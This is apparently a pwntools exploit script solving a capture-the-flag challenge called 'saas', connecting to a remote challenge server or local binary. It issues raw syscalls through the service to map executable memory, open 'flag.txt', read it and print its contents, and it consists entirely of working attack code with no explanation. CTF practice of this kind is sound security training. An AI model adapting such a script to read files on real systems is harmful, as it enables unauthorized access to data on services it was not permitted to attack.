#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'

elf = ELF('saas')

if args.REMOTE:
    p = remote('jh2i.com', 50016)
else:
    p = process(elf.path)

    if args.GDB:
        gdb.attach(p, '''
            brva 0x148f
            continue
            ''')

def _call(syscall, a = 0, b = 0, c = 0, d = 0, e = 0, f = 0):
    p.sendlineafter(b': ', str(syscall).encode())
    p.sendlineafter(b': ', str(a).encode())
    p.sendlineafter(b': ', str(b).encode())
    p.sendlineafter(b': ', str(c).encode())
    p.sendlineafter(b': ', str(d).encode())
    p.sendlineafter(b': ', str(f).encode())
    p.sendlineafter(b': ', str(e).encode())

# mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)

_call(constants.SYS_mmap | 0, 0, 0x1000, 
                constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC,
                constants.MAP_PRIVATE | constants.MAP_ANONYMOUS, -1, 0)

p.recvuntil(b'Rax: ')

mmaped_addr = int(p.recvline().rstrip(), 16)

log.info(f'mmaped addr = {hex(mmaped_addr)}')

# read(0, mmaped_addr, 0x8)

_call(constants.SYS_read | 0, 0, mmaped_addr, 0x8)

p.send(b'flag.txt')

p.recvuntil(b'Rax: ')

# open(mmaped_addr, 0, 0)

_call(constants.SYS_open | 0, mmaped_addr, 0, 0)

p.recvuntil(b'Rax: ')

file_d = int(p.recvline().rstrip(), 16)

log.info(f'fd = {hex(file_d)}')

# read(file_d, mmaped+0x10, 0x30)

_call(constants.SYS_read | 0, file_d, mmaped_addr + 0x10, 0x30)

p.recvuntil(b'Rax: ')

length = int(p.recvline().rstrip(), 16)

log.info(f'flag length = {hex(length)}')

# write(1, mmaped_addr+0x10, length)

_call(constants.SYS_write | 0, 1, mmaped_addr + 0x10, length)

"""
# write(1, mmaped_addr, 0x8)

_call(constants.SYS_write | 0, 1, mmaped_addr, 0x8)
"""

p.interactive()
